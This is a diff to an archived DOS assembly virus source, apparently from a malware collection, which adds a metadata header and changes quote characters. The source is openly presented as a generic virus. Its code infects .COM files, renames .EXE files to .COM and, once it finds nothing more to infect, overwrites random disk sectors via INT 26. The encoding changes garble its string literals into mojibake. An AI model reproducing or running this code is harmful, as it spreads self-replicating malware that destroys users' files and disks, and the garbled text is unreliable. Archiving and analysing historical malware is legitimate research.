@@ -1,3 +1,14 @@
+; ------------------------------------------------------------
+; name      G
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;=============================================================================
 ;
 ;                                    C*P*I
@@ -14,8 +25,8 @@
 ;
 ; A GENERIC VIRUS - THIS ONE MODIFIES ALL COM AND EXE FILES AND ADDS A BIT OF
 ;   CODE IN AND MAKES EACH A VIRUS. HOWEVER, WHEN IT MODIFIES EXE FILES, IT
-; RENAMES THE EXE TO A COM, CAUSING DOS TO GIVE THE ERROR ÒPROGRAM TO BIG TO
-;    FIT IN MEMORYÓ THIS WILL BE REPAIRED IN LATER VERSIONS OF THIS VIRUS.
+; RENAMES THE EXE TO A COM, CAUSING DOS TO GIVE THE ERROR ï¿½PROGRAM TO BIG TO
+;    FIT IN MEMORYï¿½ THIS WILL BE REPAIRED IN LATER VERSIONS OF THIS VIRUS.
 ;
 ; WHEN IT RUNS OUT OF FILES TO INFECT, IT WILL THEN BEGIN TO WRITE GARBAGE ON
 ;                     THE DISK. HAVE PHUN WITH THIS ONE.
@@ -71,8 +82,8 @@ MAIN:
 CHANGE_DISK:                    ;| Carry is set if no more .COM files are
       JNC NO_NAME_CHANGE        ;| found. From here, .EXE files will be
       MOV AH,17                 ;| renamed to .COM (change .EXE to .COM)
-      LEA DX,CS:MASKE_EXE       ;| but will cause the error message ÒProgram  
-      INT 21                    ;| to large to fit in memoryÓ when starting
+      LEA DX,CS:MASKE_EXE       ;| but will cause the error message ï¿½Program  
+      INT 21                    ;| to large to fit in memoryï¿½ when starting
       CMP AL,0FF                ;| larger infected programs
       JNZ NO_NAME_CHANGE        ;| (Check if an .EXE is found)
 
@@ -80,7 +91,7 @@ CHANGE_DISK:                    ;| Carry is set if no more .COM files are
       INT 21                    ;| then random sectors on the disk will be
       MOV BX,CS:POINTER         ;| overwritten depending on the system time
       MOV AL,CS:[BX]            ;| in milliseconds. This is the time of the
-      MOV BX,DX                 ;| complete ÒinfectionÓ of a storage medium.
+      MOV BX,DX                 ;| complete ï¿½infectionï¿½ of a storage medium.
       MOV CX,2                  ;| The virus can find nothing more to infect
       MOV DH,0                  ;| starts its destruction.
       INT 26                    ;| (write crap on disk)
@@ -130,7 +141,7 @@ USE_NEXT_SUBDIR:
       MOV AH,2FH                ;| Select found directory. (get dta address)
       INT 21                    ;|
       ADD BX,1CH                ;|
-      MOV ES:[BX],WÓ\Ó          ;| (address of name in dta)
+      MOV ES:[BX],Wï¿½\ï¿½          ;| (address of name in dta)
       INC BX                    ;|
       PUSH DS                   ;|
       MOV AX,ES                 ;|
@@ -168,7 +179,7 @@ CHECK_IF_ILL:                   ;| Check if already infected by virus.
       INT 21                    ;|
       MOV AH,3EH                ;| (close file)
       INT 21                    ;|
-      MOV BX,CS:[BUFFER]        ;| (look for three NOPÕs)
+      MOV BX,CS:[BUFFER]        ;| (look for three NOPï¿½s)
       CMP BX,9090               ;| 
       JZ FIND_NEXT_FILE         ;|
 
@@ -209,7 +220,7 @@ CHECK_IF_ILL:                   ;| Check if already infected by virus.
       INT 21                    ;|
 
       MOV DX,CS:[JMPBUF]        ;| Restore the old jump address. The virus
-      MOV CS:[CONTA],DX         ;| at address ÒCONTAÓ the jump which was at the
+      MOV CS:[CONTA],DX         ;| at address ï¿½CONTAï¿½ the jump which was at the
                                 ;| start of the program. This is done to
 HOPS:                           ;| preserve the executability of the host
       NOP                       ;| program as much as possible. After saving,
@@ -236,14 +247,14 @@ SEARCH_ORDER DB 0FF,1,0,2,3,0FF,00,0FF
 POINTER      DW   0000          ;| (pointer f. search order)
 COUNTER      DW   0000          ;| (counter f. nth. search) 
 DISKS        DB   0             ;| (number of disks)
-MASKE_COM    DB Ò*.COMÓ,00      ;| (search for com files)
-MASKE_DIR    DB Ò*Ó,00          ;| (search for dirÕs)
+MASKE_COM    DB ï¿½*.COMï¿½,00      ;| (search for com files)
+MASKE_DIR    DB ï¿½*ï¿½,00          ;| (search for dirï¿½s)
 MASKE_EXE    DB 0FF,0,0,0,0,0,00111111XB
-             DB 0,Ó????????EXEÓ,0,0,0,0
-             DB 0,Ó????????COMÓ,0
+             DB 0,ï¿½????????EXEï¿½,0,0,0,0
+             DB 0,ï¿½????????COMï¿½,0
 MASKE_ALL    DB 0FF,0,0,0,0,0,00111111XB
-             DB 0,Ó???????????Ó,0,0,0,0
-             DB 0,Ó????????COMÓ,0
+             DB 0,ï¿½???????????ï¿½,0,0,0,0
+             DB 0,ï¿½????????COMï¿½,0
 
 BUFFER EQU 0E00                 ;| (a safe place)
 
@@ -253,8 +264,8 @@ BUFLEN EQU 208H                 ;| Length of virus. Modify this accordingly
 
 JMPBUF EQU BUFFER+BUFLEN        ;| (a safe place for jmp)
 
-PATH  DB Ò\Ó,0                  ;| (first place)
+PATH  DB ï¿½\ï¿½,0                  ;| (first place)
 DRIVE DB 0                      ;| (actual drive)
-BACK_SLASH DB Ò\Ó
+BACK_SLASH DB ï¿½\ï¿½
 OLD_PATH DB 32 DUP (?)          ;| (old path)
 
